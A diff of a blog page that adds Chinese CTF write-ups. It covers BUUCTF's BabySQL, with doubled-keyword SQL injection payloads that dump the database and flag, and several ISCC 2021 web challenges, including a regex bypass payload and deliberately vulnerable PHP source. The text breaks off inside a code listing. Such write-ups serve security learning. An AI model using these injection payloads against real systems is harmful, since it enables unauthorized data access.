@@ -64,6 +64,62 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-buuctf4" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/05/23/buuctf4/" class="article-date">
+  <time datetime="2021-05-23T06:43:06.000Z" itemprop="datePublished">2021-05-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/05/23/buuctf4/">buuctf4</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>打开容器，发现是一个登入得界面，确定是一道SQL注入题</p>
+<p>先用万能密码尝试一下：<img src="/2021/05/23/buuctf4/image-20210523144707563.png" alt="image-20210523144707563"></p>
+<p>我们看到or并没有起到作用，说明他被过滤了，尝试<strong>双写</strong>绕过：<img src="/2021/05/23/buuctf4/image-20210523144955969.png" alt="image-20210523144955969"></p>
+<p>我们看到登入成功了，尝试union联合注入，但是我们发现服务器过滤了union 和 select，也尝试双写绕过：</p>
+<p>?username=1’%20 uniounionn selecselectt 1%23&amp;password=123</p>
+<p><img src="/2021/05/23/buuctf4/image-20210523145610941.png" alt="image-20210523145610941"></p>
+<p>我们看到成功注入了，但是列数不匹配，增加列数：<img src="/2021/05/23/buuctf4/image-20210523145912955.png" alt="image-20210523145912955"></p>
+<h4 id="开始爆库："><a href="#开始爆库：" class="headerlink" title="开始爆库："></a>开始爆库：</h4><p><code>?username=1&#39; ununionion seselectlect 1,2,database()%23&amp;password=1</code>返回的是默认数据库</p>
+<p><img src="/2021/05/23/buuctf4/image-20210523150044941.png" alt="image-20210523150044941"></p>
+<p>查一下所有数据库：</p>
+<p><code>?username=1&#39; ununionion seselectlect 1,2,group_concat(schema_name) frfromom (infoorrmation_schema.schemata) %23&amp;password=1</code><img src="/2021/05/23/buuctf4/image-20210523163448632.png" alt="image-20210523163448632"></p>
+<p>感觉flag可能藏在<code>ctf</code>数据库中</p>
+<h4 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h4><p><code>?username=1&#39; ununionion seselectlect 1,2,group_concat(table_name)frofromm(infoorrmation_schema.tables)whwhereere table_schema=&#39;ctf&#39; %23&amp;password=1</code></p>
+<p><img src="/2021/05/23/buuctf4/image-20210523151431699.png" alt="image-20210523151431699"></p>
+<h4 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h4><p><code>?username=1&#39; uniounionn selecselectt 1,2,group_concat(column_name) frofromm (infoorrmation_schema.columns) wherwheree table_name=&quot;Flag&quot;%23&amp;password=1</code></p>
+<p><img src="/2021/05/23/buuctf4/image-20210523164546430.png" alt="image-20210523164546430"></p>
+<h4 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h4><p><code>?username=1&#39; uniounionn selecselectt 1,2,group_concat(flag) frofromm (ctf.Flag)%23&amp;password=1</code></p>
+<p><img src="/2021/05/23/buuctf4/image-20210523170907245.png" alt="image-20210523170907245"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/05/23/buuctf4/" data-id="ckp56fmwv0000rovu5bqegfb3" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-序列化与反序列化" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/05/22/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date">
@@ -260,6 +316,132 @@
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-2021ISCC" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/05/04/2021ISCC/" class="article-date">
+  <time datetime="2021-05-04T04:23:03.000Z" itemprop="datePublished">2021-05-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/05/04/2021ISCC/">ISCC</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="web：ISCC客服冲冲冲（一）——关于js前端"><a href="#web：ISCC客服冲冲冲（一）——关于js前端" class="headerlink" title="web：ISCC客服冲冲冲（一）——关于js前端"></a>web：ISCC客服冲冲冲（一）——关于js前端</h1><p>打开容器：</p>
+<p><img src="/2021/05/04/2021ISCC/1.png" alt="1"></p>
+<p>发现右边那个会自动加票，而且加的非常快，如果手动点击20秒内肯定干不过</p>
+<p>根据经验这种题肯定是前端的题，F12打开控制器，查看源码</p>
+<p><img src="/2021/05/04/2021ISCC/2.png" alt="2"></p>
+<p>删除箭头所指一行代码，这样就没办法给假的客服偷票，然后在倒计时内疯狂给真的客服投票就好了。</p>
+<p><img src="/2021/05/04/2021ISCC/3.png" alt="3"></p>
+<h1 id="web：这是啥——jsfuck"><a href="#web：这是啥——jsfuck" class="headerlink" title="web：这是啥——jsfuck"></a>web：这是啥——jsfuck</h1><p>打开容器：<img src="/2021/05/04/2021ISCC/image-20210504180322547.png" alt="image-20210504180322547"></p>
+<p>查看源码：<img src="/2021/05/04/2021ISCC/4-1620122808281.png" alt="4"></p>
+<p>发现了一大串这种符号，因为之前有做过类似的，知道这是jsfuck编码。直接复制，粘贴在控制台上回车执行</p>
+<p><img src="/2021/05/04/2021ISCC/5.png" alt="5"></p>
+<h1 id="web：Web01——robots文件-正则匹配"><a href="#web：Web01——robots文件-正则匹配" class="headerlink" title="web：Web01——robots文件+正则匹配"></a>web：Web01——robots文件+正则匹配</h1><p>打开容器：<img src="/2021/05/04/2021ISCC/6.png" alt="6"></p>
+<p>查看robots.txt<img src="/2021/05/04/2021ISCC/7.png" alt="7"></p>
+<p>接着访问/src/code/code.txt，跳出404，然后我试着把<code>/src</code>删掉，结果就可以了。为什么呢？我问了大佬，这个src就代指了上面的ip，因此我们只要输入<code>/code/code.txt</code>就好了<img src="/2021/05/04/2021ISCC/8.png" alt="8"></p>
+<p><strong>代码审计：</strong></p>
+<p>我们可以看到通过<code>?password</code>传参，先判断password的值是否为是既含数字又含字母的，接着判断传参的字符串长度是否超过8，同时传参的值是否大于9999999，最后判断字符串中是否存在<code>*-*</code></p>
+<ul>
+<li><p>那么我们现在理清一下要满足的条件：</p>
+<p>1.要既含字母又含字符串</p>
+<p>2.长度不得超过8，且值必须大于9999999——用科学计数法绕过</p>
+<p>3.存在<code>*-*</code></p>
+</li>
+<li><p>那么对应的payload：<code>1e8*-*</code></p>
+</li>
+</ul>
+<p><img src="/2021/05/04/2021ISCC/9.png" alt="9"></p>
+<h1 id="web：登录——网站备份文件泄露-反序列化字符串逃逸"><a href="#web：登录——网站备份文件泄露-反序列化字符串逃逸" class="headerlink" title="web：登录——网站备份文件泄露+反序列化字符串逃逸"></a>web：登录——网站备份文件泄露+反序列化字符串逃逸</h1><p>刚刚打开容器还以为这是一道SQL注入题，但是试了一会后感觉不对劲，尝试用dirsearch扫描一下服务器端口<img src="/2021/05/04/2021ISCC/10-1620480644596.png" alt="10"></p>
+<p>我们可以看到有好几个php文件，但是前三个文件打开后都是空白文件，尝试打开第四个</p>
+<p>（sp：网站的文件都是放置在www文件夹下面的，zip是一种压缩格式。也就是WWW文件夹里面的文件全部压缩在<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a>里面了。）</p>
+<p><img src="/2021/05/04/2021ISCC/11.png" alt="11"></p>
+<p><img src="/2021/05/04/2021ISCC/12.png" alt="12"></p>
+<p>一 一打开文件进行代码审计一下：</p>
+<p><strong>class.php：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $table = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params">$username</span>) </span>&#123;</span><br><span class="line">		$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params">$username, $password</span>) </span>&#123;</span><br><span class="line">		$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">		$password = <span class="built_in">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">		$key_list = <span class="keyword">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">		$value_list = <span class="keyword">Array</span>($username, md5($password));</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$username, $password</span>) </span>&#123;</span><br><span class="line">		$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">		$password = <span class="built_in">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		$object = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">		<span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params">$username</span>) </span>&#123;</span><br><span class="line">		$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		$object = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">		<span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params">$username, $new_profile</span>) </span>&#123;</span><br><span class="line">		$username = <span class="built_in">parent</span>::filter($username);</span><br><span class="line">		$new_profile = <span class="built_in">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, $new_profile, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $link = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params">$config</span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">			$config[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line">			$config[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">			$config[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">		);</span><br><span class="line">		mysql_select_db($config[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">		mysql_query(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">$table, $where, $ret = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">		$sql = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		$result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">		<span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params">$table, $key_list, $value_list</span>) </span>&#123;</span><br><span class="line">		$key = implode(<span class="string">&#x27;,&#x27;</span>, $key_list);</span><br><span class="line">		$value = <span class="string">&#x27;\&#x27;&#x27;</span> . implode(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, $value_list) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line">		$sql = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params">$table, $key, $value, $where</span>) </span>&#123;</span><br><span class="line">		$sql = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>) </span>&#123;</span><br><span class="line">		$escape = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		$escape = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $escape) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		$string = preg_replace($escape, <span class="string">&#x27;_&#x27;</span>, $string);</span><br><span class="line"></span><br><span class="line">		$safe = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		$safe = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, $safe) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace($safe, <span class="string">&#x27;hacker&#x27;</span>, $string);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$user-&gt;connect($config);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>class.php中的限制：</strong></p>
+<p>1.update_profile 中对 new_profile 用 filter 进行了过滤；filter的功能是通过正则匹配把字符串中存在的<code>&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;</code>替换成<code>&#39;hacker&#39;</code></p>
+<p><strong>config.php：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$config[<span class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	$config[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	$flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到在config.php中有变量flag，但为空，flag应该在服务器的config.php文件中，可以利用的漏洞读取服务器的flag</p>
+<p><strong>register.php：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>($_POST[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; $_POST[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		$username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		$password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen($username) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($username) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen($password) &lt; <span class="number">3</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span>(!$user-&gt;is_exists($username)) &#123;</span><br><span class="line">			$user-&gt;register($username, $password);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;</span>;		</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;User name Already Exists&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=<span class="string">&quot;static/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=<span class="string">&quot;static/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">		&lt;form action=&quot;register.php&quot; method=&quot;post&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">			&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">			&lt;h3&gt;Register&lt;/h3&gt;</span><br><span class="line">			&lt;label&gt;Username:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Password:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line"></span><br><span class="line">			&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;REGISTER&lt;/button&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个就是注册页面对应的源码，没什么特别的</p>
+<p><strong>update.php：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($_POST[<span class="string">&#x27;phone&#x27;</span>] &amp;&amp; $_POST[<span class="string">&#x27;email&#x27;</span>] &amp;&amp; $_POST[<span class="string">&#x27;nickname&#x27;</span>] &amp;&amp; $_FILES[<span class="string">&#x27;photo&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		$username = $_SESSION[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, $_POST[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="string">&#x27;nickname&#x27;</span>]) || strlen($_POST[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		$file = $_FILES[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($file[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">		$profile[<span class="string">&#x27;phone&#x27;</span>] = $_POST[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		$profile[<span class="string">&#x27;email&#x27;</span>] = $_POST[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		$profile[<span class="string">&#x27;nickname&#x27;</span>] = $_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		$profile[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5($file[<span class="string">&#x27;name&#x27;</span>]);</span><br><span 